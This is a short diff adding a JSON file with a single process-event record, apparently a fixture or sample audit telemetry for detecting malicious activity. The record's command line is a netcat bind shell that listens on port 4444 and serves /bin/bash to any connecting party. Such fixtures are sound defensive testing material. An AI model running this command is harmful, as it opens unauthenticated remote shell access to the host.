@@ -1,0 +1,10 @@
+[
+ {
+  "image": "/usr/bin/nc",
+  "commandLine": "nc -lvnp 4444 -e /bin/bash",
+  "source": "laurel",
+  "user": "1000",
+  "pid": 7120,
+  "ppid": 7100
+ }
+]
